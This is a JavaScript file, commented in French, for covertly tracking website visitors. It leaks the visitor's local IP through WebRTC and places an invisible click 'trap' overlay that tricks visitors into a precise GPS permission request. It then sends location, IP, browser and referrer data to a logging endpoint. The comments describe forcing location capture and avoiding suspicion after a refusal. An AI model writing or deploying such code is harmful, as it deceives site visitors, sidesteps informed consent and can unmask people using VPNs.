// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) resolve(ips[0]);
                else resolve("Inconnue (Bloqué/VPN)");
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && ip.includes('.')) {
                ips.push(ip);
            }
        };

        // Timeout plus long pour laisser le temps au STUN de répondre
        setTimeout(() => {
            if (ips.length > 0) resolve(ips[0]);
            else resolve("Inconnue (Timeout)");
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );
    });
}

async function logVisitor(preciseLocation = null) {
    try {
        const localIp = await getLocalIP();
        
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                localIp: localIp,
                preciseLocation: preciseLocation,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Nouvelle logique pour "forcer" la localisation avec un piège invisible
async function startVerification() {
    const overlay = document.getElementById('verification-overlay');

    if (!overlay) {
        logVisitor();
        return;
    }

    // Dès que le visiteur clique N'IMPORTE OÙ sur la page
    overlay.addEventListener('click', async () => {
        // On lance immédiatement la demande de localisation
        const location = await getPreciseLocation();

        if (location) {
            // S'il accepte, on fait disparaître le piège et on log avec le GPS
            overlay.style.display = 'none';
            logVisitor(location);
        } else {
            // S'il refuse, on log quand même via l'IP
            // On peut laisser l'overlay pour qu'il soit obligé de recliquer plus tard
            // ou le cacher pour ne pas éveiller les soupçons après un refus
            overlay.style.display = 'none'; 
            logVisitor(null);
        }
    }, { once: true }); // On ne capture qu'un seul clic
}

if (document.readyState === 'complete') {
    startVerification();
} else {
    window.addEventListener('load', startVerification);
}
